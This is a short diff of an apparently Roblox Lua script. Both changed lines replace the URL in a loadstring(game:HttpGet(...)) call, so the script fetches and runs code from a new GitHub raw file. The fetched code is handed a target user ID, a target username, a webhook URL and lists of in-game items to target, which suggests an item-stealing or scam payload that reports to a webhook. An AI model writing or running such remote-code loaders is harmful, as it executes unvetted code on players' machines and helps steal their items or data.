@@ -295,7 +295,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yahyalouli1-svg/Xlxl/refs/heads/main/dex%20finder%20by%20printed.txt"))()
 end)
 
 task.spawn(function()
@@ -303,7 +303,7 @@ task.spawn(function()
 
     task.wait(1)
 
-    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/yahyalouli1-svg/Xlxl/refs/heads/main/dex%20finder%20by%20printed.txt"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
     end
